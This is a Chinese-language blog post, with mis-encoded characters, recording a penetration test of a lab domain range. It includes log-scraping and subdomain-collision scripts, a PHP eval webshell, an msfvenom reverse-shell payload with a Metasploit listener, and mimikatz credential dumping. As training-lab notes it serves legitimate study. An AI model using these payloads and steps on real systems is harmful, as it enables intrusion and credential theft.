<!DOCTYPE html>
<html lang="en" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="author" content="Keep your passion for what you love !" />
  <!-- Open Graph Description ç®€çŸ­æ‘˜è¦-->
  
  <!-- ç”¨äºæœç´¢å¼•æ“çš„æ–‡ç« æ‘˜è¦ -->
  
  
  
  <title>
    
      æš—æœˆé¡¹ç›®å…­å†…ç½‘åŸŸæ¸—é€ç¬”è®° 
      
      
      |
    
     Keep your passion for what you love !
  </title>

  
    <link rel="apple-touch-icon" href="/images/favicon.png">
    <link rel="icon" href="/images/favicon.png">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  <link rel="stylesheet" href="/css/main.css" />
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
  <!-- ä»£ç å—é£æ ¼ -->
  
    
<link rel="stylesheet" href="/css/figcaption/mac-block.css">

  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="/js/fancybox.js"></script>


  

  
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<meta name="generator" content="Hexo 8.1.1"><link rel="alternate" href="/atom.xml" title="Keep your passion for what you love !" type="application/atom+xml">
</head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- å¤´åƒå–æ¶ˆæ‡’åŠ è½½ï¼Œæ·»åŠ no-lazy -->
      
        <img src="/images/avatar.png" alt="">
      
    </a>
    <div class="nickname"><a href="/"></a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/tags/">
          <a href="/tags/">Tags</a>
        </li>
      
        <li class="nav-item" data-path="/categories/">
          <a href="/categories/">Category</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- æ–‡ç« è¯¦æƒ…é¡µï¼Œå±•ç¤ºæ–‡ç« å…·ä½“å†…å®¹ï¼Œurlå½¢å¼ï¼šhttps://yoursite/æ–‡ç« æ ‡é¢˜/ -->
<!-- åŒæ—¶ä¸ºã€Œæ ‡ç­¾tagã€ï¼Œã€Œæœ‹å‹friendã€ï¼Œã€Œåˆ†ç±»categoriesã€ï¼Œã€Œå…³äºaboutã€é¡µé¢çš„æ‰¿è½½é¡µé¢ï¼Œå…·ä½“å±•ç¤ºå–å†³äºpage.type -->


  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.10/dist/clipboard.min.js"></script>
  
  
<script src="/js/codeCopy.js"></script>







  

  

  

  
  <!-- æ–‡ç« å†…å®¹é¡µ urlå½¢å¼ï¼šhttps://yoursite/æ–‡ç« æ ‡é¢˜/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">æš—æœˆé¡¹ç›®å…­å†…ç½‘åŸŸæ¸—é€ç¬”è®°</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
          2025-05-14 17:22:38
        </span>
        
              <span class="post-tags">
                <i class="iconfont icon-tags mr-10" title="Tags"></i>
                
                <span class="span--tag mr-8">
                  <a href="/tags/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/" title="é»„é‡‘ç¥¨æ®">
                    #é»„é‡‘ç¥¨æ®
                  </a>
                </span>
                
                <span class="span--tag mr-8">
                  <a href="/tags/%E5%9F%9F%E6%8E%A7/" title="åŸŸæ§">
                    #åŸŸæ§
                  </a>
                </span>
                
              </span>
          
              <span class="post-categories">
                <i class="iconfont icon-bookmark" title="Categories"></i>
                
                <span class="span--category">
                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="å†…ç½‘æ¸—é€">
                    <b>#</b> å†…ç½‘æ¸—é€
                  </a>
                </span>
                
              </span>
          
      </div>
      <div class="markdown-body">
        <h2 id="ç¯å¢ƒæ­å»º">ç¯å¢ƒæ­å»º</h2>
<p>é¶åœºç¯å¢ƒçš„æ‹“æ‰‘å›¾å¦‚ä¸‹ï¼š</p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512124656889.png" alt="image-20250512124656889"></p>
<p>é¶åœºæ˜¯<code>webhack123</code>ï¼Œ<code>WEB</code>æœåŠ¡å™¨æœ‰ä¸¤å—ç½‘å¡ï¼Œ<code>DC</code>æ˜¯åŸŸæ§ã€‚</p>
<h2 id="ä¿¡æ¯æ”¶é›†">ä¿¡æ¯æ”¶é›†</h2>
<h3 id="ç«¯å£æ¢æµ‹">ç«¯å£æ¢æµ‹</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.1.13</span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512125122545.png" alt="image-20250512125122545"></p>
<h3 id="nmapè·å–ç³»ç»Ÿå’Œç‰ˆæœ¬ä¿¡æ¯">nmapè·å–ç³»ç»Ÿå’Œç‰ˆæœ¬ä¿¡æ¯</h3>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 80,135,139,445,3306,3389,47001,49152,49153,49154,49155,49156,49157 -A 192.168.1.13 -oA webhack</span><br></pre></td></tr></table></figure>
<p>ç”±æ‰«æçš„ä¿¡æ¯å¯çŸ¥ï¼Œ<code>web</code>æœåŠ¡å™¨ä½¿ç”¨çš„æ˜¯<code>phpstudy</code>ã€‚æ“ä½œç³»ç»Ÿä¸º<code>Windows Server 2008 R2</code></p>
<h2 id="å¯¹ç½‘ç«™è¿›è¡Œæµ‹è¯•">å¯¹ç½‘ç«™è¿›è¡Œæµ‹è¯•</h2>
<p>åœ¨<code>Mac</code>çš„<code>hosts</code>æ–‡ä»¶ä¸­æ·»åŠ <code>192.168.1.13 www.webhack123.com</code>å’Œ<code>192.168.1.13 admin.webhack123.com</code>ï¼Œè¿™æ ·æˆ‘çš„<code>Mac</code>é€šè¿‡åŸŸåå°±å¯è®¿é—®åˆ°å¯¹åº”çš„ç½‘ç«™ã€‚</p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512124840963.png" alt="image-20250512124840963"></p>
<h3 id="ffufç›®å½•æ–‡ä»¶æ‰«æ">ffufç›®å½•æ–‡ä»¶æ‰«æ</h3>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -u http://www.webhack123.com/FUZZ -w Wordslist/all.txt</span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512125641975.png" alt="image-20250512125641975"></p>
<h3 id="wc-dbæ–‡ä»¶ä¸‹è½½">wc.dbæ–‡ä»¶ä¸‹è½½</h3>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://www.webhack123.com/.svn/wc.db</span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512130405171.png" alt="image-20250512130405171"></p>
<p>ä½¿ç”¨<code>Navicat</code>æ‰“å¼€æ•°æ®åº“ï¼Œå¯ä»¥çœ‹å‡ºä½¿ç”¨åˆ°çš„æ¡†æ¶ä¸º<code>thinkphp</code></p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512130708281.png" alt="image-20250512130708281"></p>
<h3 id="thinkphpæ—¥å¿—æ–‡ä»¶æ³„éœ²">thinkphpæ—¥å¿—æ–‡ä»¶æ³„éœ²</h3>
<p>åœ¨<code>thinkphp_3.1.3</code>ä¸­ï¼Œæ—¥å¿—æ–‡ä»¶æ˜¯å¼€å¯çš„ï¼Œç”±<code>wc.db</code>å¯ä»¥çŸ¥é“ç›®å½•ä½ç½®ã€‚</p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512131128450.png" alt="image-20250512131128450"></p>
<p>æ—¥å¿—è·¯å¾„æ ¼å¼å¦‚ï¼š<a target="_blank" rel="noopener" href="http://www.webhack123.com/App/Runtime/Logs/18_06_28.log">http://www.webhack123.com/App/Runtime/Logs/18_06_28.log</a></p>
<h3 id="æå–æ—¥å¿—è·å–å¯†ç ">æå–æ—¥å¿—è·å–å¯†ç </h3>
<p>ä½¿ç”¨<code>python</code>ç¼–å†™æ—¥å¿—æ–‡ä»¶æå–è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#codingï¼šutf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url =<span class="string">&quot;http://www.webhack123.com/App/Runtime/Logs&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_urls</span>(<span class="params">patch,y</span>):</span><br><span class="line">    urls=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">32</span>):</span><br><span class="line">            <span class="keyword">if</span> i&lt;<span class="number">10</span>:</span><br><span class="line">                <span class="keyword">if</span> j&lt;<span class="number">10</span>:</span><br><span class="line">                    urls.append(patch+<span class="string">&quot;/%s_0%s_0%s.log&quot;</span> % (y,i,j))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    urls.append(patch+<span class="string">&quot;/%s_0%s_%s.log&quot;</span> % (y,i,j))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> j&lt;<span class="number">10</span>:</span><br><span class="line">                    urls.append(patch+<span class="string">&quot;/%s_%s_0%s.log&quot;</span> % (y,i,j))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    urls.append(patch+<span class="string">&quot;/%s_%s_%s.log&quot;</span> % (y,i,j))</span><br><span class="line">                    </span><br><span class="line">    <span class="keyword">return</span> urls</span><br><span class="line"></span><br><span class="line">urls = add_urls(url,<span class="string">&quot;20&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> urls:</span><br><span class="line">    req=requests.get(i)</span><br><span class="line">    <span class="keyword">if</span> req.status_code==<span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">    html = req.text</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;webhack123.txt&quot;</span>,<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(html)</span><br></pre></td></tr></table></figure>
<p>è·å–æ—¥å¿—ï¼Œå¹¶åœ¨æ—¥å¿—ä¸­æŸ¥æ‰¾åˆ°æ³„éœ²çš„ç®¡ç†å‘˜å¯†ç ã€‚</p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512132623141.png" alt="image-20250512132623141"></p>
<p>è´¦å·ä¸º<code>admin</code>ï¼Œå¯†ç çš„å“ˆå¸Œä¸º<code>74c774ef39b5b977c1fd59dbfc73c3e380a65aa3</code>ï¼Œç»è¿‡<code>cmd5</code>å¾—å‡ºå¯†ç ä¸º<code>web123</code>ã€‚</p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512132826440.png" alt="image-20250512132826440"></p>
<h3 id="hostç¢°æ’ç®¡ç†åå°å­åŸŸå">hostç¢°æ’ç®¡ç†åå°å­åŸŸå</h3>
<p>å¦‚æœæ‰«æç›®å½•è¿˜æ˜¯æ‰¾ä¸åˆ°åå°ï¼Œå¯ä»¥å°è¯•è¿›è¡Œ<code>host</code>ç¢°æ’å‡ºå­åŸŸåã€‚</p>
<p>ä»£ç å‚è€ƒ<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>ï¼Œå˜åŠ¨äº†ä¸€ä¸‹ä»£ç ï¼Œ<code>ip.txt</code>ç”¨äºå­˜æ”¾ç›®æ ‡çš„<code>IP</code>åœ°å€ï¼Œ<code>host.txt</code>ç”¨äºå­˜æ”¾å­åŸŸåå‰ç¼€ã€‚è¿™é‡Œæ˜¯<code>http</code>ï¼Œä¸éœ€è¦è¿›è¡Œ<code>https</code>çš„çˆ†ç ´ã€‚è¿è¡Œä»£ç ï¼Œå­åŸŸåå’Œ<code>IP</code>åœ°å€è¿›è¡ŒåŒ¹é…ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment">#è¿™æ˜¯ä¸€ä¸ªç”¨äºIPå’ŒåŸŸåç¢°æ’åŒ¹é…è®¿é—®çš„å°å·¥å…·(ä¿®æ”¹è¿‡)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lists=[]</span><br><span class="line">files = <span class="built_in">open</span>(<span class="string">&#x27;hosts_ok.txt&#x27;</span>,<span class="string">&#x27;w+&#x27;</span>)</span><br><span class="line"><span class="comment">#è¯»å–IPåœ°å€</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;====================================å¼€ å§‹ åŒ¹ é…====================================&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> iplist <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;ip.txt&quot;</span>):</span><br><span class="line">    ip = iplist.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="comment">#è¯»å–hoståœ°å€</span></span><br><span class="line">    <span class="comment">#http_s = [&#x27;http://&#x27;,&#x27;https://&#x27;]</span></span><br><span class="line">    http_s = [<span class="string">&#x27;http://&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> http_s :</span><br><span class="line">        <span class="keyword">for</span> hostlist <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;host.txt&quot;</span>,<span class="string">&#x27;r&#x27;</span>):</span><br><span class="line">            tmp = hostlist.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            host = tmp+<span class="string">&#x27;.webhack123.com&#x27;</span></span><br><span class="line">            headers = &#123;<span class="string">&#x27;Host&#x27;</span>:host,<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r = requests.session()</span><br><span class="line">                requests.packages.urllib3.disable_warnings()</span><br><span class="line">                rhost = r.get(h + ip,verify=<span class="literal">False</span>,headers=headers,timeout=<span class="number">5</span>)</span><br><span class="line">                rhost.encoding=<span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">                title = re.search(<span class="string">&#x27;&lt;title&gt;(.*)&lt;/title&gt;&#x27;</span>, rhost.text).group(<span class="number">1</span>) <span class="comment">#è·å–æ ‡é¢˜</span></span><br><span class="line">                info = <span class="string">&#x27;%s -- %s åè®®ï¼š%s æ•°æ®åŒ…å¤§å°ï¼š%d æ ‡é¢˜ï¼š%s&#x27;</span> % (ip,host,h,<span class="built_in">len</span>(rhost.text),title)</span><br><span class="line">                lists.append(info)</span><br><span class="line">                files.write(info + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(info)</span><br><span class="line">            <span class="keyword">except</span> Exception :</span><br><span class="line">                error = ip + <span class="string">&quot; --- &quot;</span> + host + <span class="string">&quot; --- è®¿é—®å¤±è´¥ï¼~&quot;</span></span><br><span class="line">                <span class="built_in">print</span>(error)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;====================================åŒ¹ é… æˆ åŠŸ çš„ åˆ— è¡¨====================================&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lists:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>
<p>ç»“æœå¦‚ä¸‹ï¼Œå‘ç°äº†ä¸€ä¸ª<code>admin.webhack123.com</code>å­åŸŸåã€‚</p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512143022860.png" alt="image-20250512143022860"></p>
<p>æˆåŠŸæ‰¾åˆ°äº†åå°çš„ç®¡ç†ç«™ç‚¹ã€‚</p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512143257291.png" alt="image-20250512143257291"></p>
<p>æ ¹æ®å‰é¢è·å–åˆ°çš„è´¦å·å¯†ç <code>admin/web123</code>å¯ä»¥ç™»é™†ç®¡ç†å‘˜ç•Œé¢ã€‚</p>
<h3 id="ä¸Šä¼ æ–‡ä»¶è·å–webshell">ä¸Šä¼ æ–‡ä»¶è·å–webshell</h3>
<p>ç™»é™†åˆ°ç®¡ç†å‘˜ç•Œé¢åï¼Œè¿›è¡Œæ–‡ä»¶çš„ä¸Šä¼ ã€‚è®¾ç½®å…è®¸ä¸Šä¼ <code>php</code>ï¼Œä¸Šä¼ ä¸€å¥è¯æœ¨é©¬<code>&lt;?php @eval($_POST['pass']);?&gt;</code>ã€‚</p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512144703229.png" alt="image-20250512144703229"></p>
<p>ä¸Šä¼ æˆåŠŸï¼Œè·å–<code>shell</code>çš„<code>url</code>ä¸º<code>http://admin.webhack123.com/Public/Upload/20250512/d58f8404ac973d0352c666b9f83056a9.php</code>ï¼Œä½¿ç”¨èšå‰‘è¿›è¡Œè¿æ¥ã€‚</p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512145624138.png" alt="image-20250512145624138"></p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512150325172.png" alt="image-20250512150325172"></p>
<h2 id="MSFè¿›è¡Œææƒå’Œä¿¡æ¯æ”¶é›†">MSFè¿›è¡Œææƒå’Œä¿¡æ¯æ”¶é›†</h2>
<h3 id="ç”Ÿæˆæ”»å‡»è½½è·">ç”Ÿæˆæ”»å‡»è½½è·</h3>
<p><code>phpstudy</code>ç¯å¢ƒä¸‹ï¼Œä¸Šä¼ å¹¶æ‰§è¡Œ<code>exe</code>æ–‡ä»¶ï¼Œç›´æ¥å°±æ˜¯ç³»ç»Ÿçš„æœ€é«˜æƒé™äº†ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.3 lport=12345 -f exe -o tt.exe</span><br></pre></td></tr></table></figure>
<p>åœ¨æœ¬æœºçš„æ ¹ç›®å½•ä¼šç”Ÿæˆä¸€ä¸ª<code>tt.exe</code>æ–‡ä»¶ã€‚</p>
<h3 id="ç›‘å¬ä¸Šçº¿">ç›‘å¬ä¸Šçº¿</h3>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.1.3</span><br><span class="line">lhost =&gt; 192.168.1.3</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 12345</span><br><span class="line">lport =&gt; 12345</span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä½¿ç”¨çš„æ˜¯<code>mac m1</code>ç¯å¢ƒå®‰è£…çš„<code>msf</code>ï¼Œç›‘å¬å‘ç°ä¸€ç›´æŠ¥é”™ï¼Œè¿æ¥ä¸ä¸Š<code>shell</code>ã€‚è¿™é‡Œæˆ‘å¡äº†å¾ˆä¹…ï¼Œæƒ³ç ´è„‘è¢‹ï¼Œä¹Ÿæ²¡æƒ³åˆ°æŠŠ<code>mac</code>çš„é˜²ç«å¢™å…³äº†å°±å¥½äº†ğŸ˜‘ã€‚</p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513113931755.png" alt="image-20250513113931755"></p>
<p>æˆåŠŸæ‹¿åˆ°<code>shell</code>ã€‚</p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513114424829.png" alt="image-20250513114424829"></p>
<h3 id="migrateè¿ç§»è¿›ç¨‹">migrateè¿ç§»è¿›ç¨‹</h3>
<p>æ‰¾åˆ°åˆé€‚çš„è¿›ç¨‹ï¼Œè¿›è¡Œè¿›ç¨‹çš„è¿ç§»ï¼Œè¿™é‡Œå¾ˆå¤šäººä½¿ç”¨çš„æ˜¯<code>migrate 476</code>ã€‚</p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513130552170.png" alt="image-20250513130552170"></p>
<p>è¿ç§»æˆåŠŸã€‚</p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513130700625.png" alt="image-20250513130700625"></p>
<h3 id="mimikatzå“ˆå¸Œæ˜æ–‡è·å–">mimikatzå“ˆå¸Œæ˜æ–‡è·å–</h3>
<p>ä½¿ç”¨<code>load kiwi</code>ï¼ŒåŠ è½½<code>mimikatz</code>æ¨¡å—ã€‚</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">creds_all</span><br><span class="line">creds_wdigest</span><br><span class="line">creds_tspkg</span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513131257484.png" alt="image-20250513131257484"></p>
<p><code>arp</code>å¯ä»¥å‘ç°æ›´å¤šçš„ä¸»æœºã€‚</p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513131434911.png" alt="image-20250513131434911"></p>
<h2 id="è·¨ç½‘æ®µåŸŸæ¸—é€">è·¨ç½‘æ®µåŸŸæ¸—é€</h2>
<h3 id="MSFè·¨ç½‘æ®µçš„åŸŸæ¸—é€">MSFè·¨ç½‘æ®µçš„åŸŸæ¸—é€</h3>
<p>ä½¿ç”¨<code>metasploit</code>å’Œ<code>cobalt strike</code>è¿›è¡ŒåŸŸæ¸—é€ã€‚</p>
<h4 id="ç¡®è®¤åŸŸç¯å¢ƒ">ç¡®è®¤åŸŸç¯å¢ƒ</h4>
<p><code>ps</code>æŸ¥çœ‹è¿›ç¨‹ï¼Œè¿›è¡Œä»¤ç‰Œçªƒå–ï¼Œå¿…é¡»åˆ‡æ¢åˆ°<code>adminstrator</code>ï¼Œé<code>system</code>ï¼Œæ‰èƒ½ä½¿ç”¨<code>net config workstation</code>âš ï¸</p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513133145485.png" alt="image-20250513133145485"></p>
<p>åˆ‡æ¢åˆ°<code>shell</code>ï¼Œç„¶åæ‰§è¡Œ<code>net config workstation</code>ã€‚å‡ºç°ä¹±ç æƒ…å†µæ—¶åœ¨è·å–çš„<code>shell</code>ä¸­æ‰§è¡Œ<code>chcp 65001</code>ã€‚</p>
